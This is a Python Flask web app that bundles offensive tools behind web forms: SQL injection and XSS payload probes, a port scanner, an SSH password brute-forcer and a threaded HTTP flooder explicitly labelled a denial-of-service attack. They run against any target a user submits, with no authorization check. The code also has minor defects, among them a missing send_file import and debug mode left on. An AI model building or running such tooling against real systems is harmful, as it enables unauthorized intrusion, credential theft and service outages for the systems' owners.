from flask import Flask, request, render_template, redirect, url_for
import socket
import threading
import requests
import paramiko
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
import io

app = Flask(__name__)

# -------------------------
# SQL Injection Testing
# -------------------------
sql_payloads = ["' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*"]

def test_sql_injection(url):
    results = []
    for payload in sql_payloads:
        target_url = f"{url}?id={payload}"
        response = requests.get(target_url)
        if "error" in response.text or "You have an error" in response.text:
            results.append(f"[+] Vulnerable to SQL Injection: {target_url}")
        else:
            results.append(f"[-] Not Vulnerable: {target_url}")
    return results

# -------------------------
# Port Scanning
# -------------------------
def scan_ports(target_ip, port_range):
    results = []
    for port in range(port_range[0], port_range[1] + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            results.append(f"[+] Port {port} is open")
        else:
            results.append(f"[-] Port {port} is closed")
        sock.close()
    return results

# -------------------------
# Brute Force Attack (SSH)
# -------------------------
def ssh_brute_force(target_ip, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    results = []
    for password in password_list:
        try:
            ssh.connect(target_ip, username=username, password=password)
            results.append(f"[+] Login Successful: {username}:{password}")
            return results
        except paramiko.AuthenticationException:
            results.append(f"[-] Failed Login: {username}:{password}")
    return results

# -------------------------
# Denial of Service (DoS) Attack
# -------------------------
def send_request(url, request_limit):
    results = []
    for _ in range(request_limit):
        try:
            response = requests.get(url)
            results.append(f"Request sent, Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            results.append(f"Error: {e}")
    return results

def dos_attack(target_url, threads_count, request_limit):
    results = []
    def thread_func():
        results.extend(send_request(target_url, request_limit))
    
    threads = []
    for _ in range(threads_count):
        thread = threading.Thread(target=thread_func)
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()
    
    return results

# -------------------------
# XSS Testing
# -------------------------
xss_payloads = ['<script>alert(1)</script>', '" onerror="alert(1)', "'><script>alert(1)</script>"]

def test_xss(url):
    results = []
    for payload in xss_payloads:
        target_url = f"{url}?q={payload}"
        response = requests.get(target_url)
        if payload in response.text:
            results.append(f"[+] XSS Vulnerability Detected: {target_url}")
        else:
            results.append(f"[-] Not Vulnerable: {target_url}")
    return results

# -------------------------
# Report Generation
# -------------------------
def generate_report(results):
    buffer = io.BytesIO()
    c = canvas.Canvas(buffer, pagesize=letter)
    width, height = letter
    c.drawString(100, height - 100, "Penetration Test Report")
    
    y = height - 150
    for result in results:
        c.drawString(100, y, result)
        y -= 20
    
    c.save()
    buffer.seek(0)
    return buffer

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/test_sql_injection', methods=['POST'])
def handle_sql_injection():
    url = request.form['url']
    results = test_sql_injection(url)
    return render_template('results.html', results=results)

@app.route('/scan_ports', methods=['POST'])
def handle_scan_ports():
    target_ip = request.form['target_ip']
    port_range_input = request.form['port_range']
    if '-' in port_range_input:
        port_range = port_range_input.split('-')
        port_range = (int(port_range[0]), int(port_range[1]))
    else:
        port_range = (int(port_range_input), int(port_range_input))
    results = scan_ports(target_ip, port_range)
    return render_template('results.html', results=results)

@app.route('/ssh_brute_force', methods=['POST'])
def handle_ssh_brute_force():
    target_ip = request.form['target_ip']
    username = request.form['username']
    password_list = request.form['password_list'].split(',')
    results = ssh_brute_force(target_ip, username, password_list)
    return render_template('results.html', results=results)

@app.route('/dos_attack', methods=['POST'])
def handle_dos_attack():
    target_url = request.form['target_url']
    threads_count = int(request.form['threads_count'])
    request_limit = int(request.form['request_limit'])
    results = dos_attack(target_url, threads_count, request_limit)
    return render_template('results.html', results=results)

@app.route('/test_xss', methods=['POST'])
def handle_xss():
    url = request.form['url']
    results = test_xss(url)
    return render_template('results.html', results=results)

@app.route('/generate_report', methods=['POST'])
def handle_generate_report():
    results = [
        request.form['sql_injection_results'],
        request.form['port_scanning_results'],
        request.form['xss_results']
    ]
    report = generate_report(results)
    return send_file(io.BytesIO(report.getvalue()), attachment_filename='report.pdf', as_attachment=True)

if __name__ == "__main__":
    app.run(debug=True)
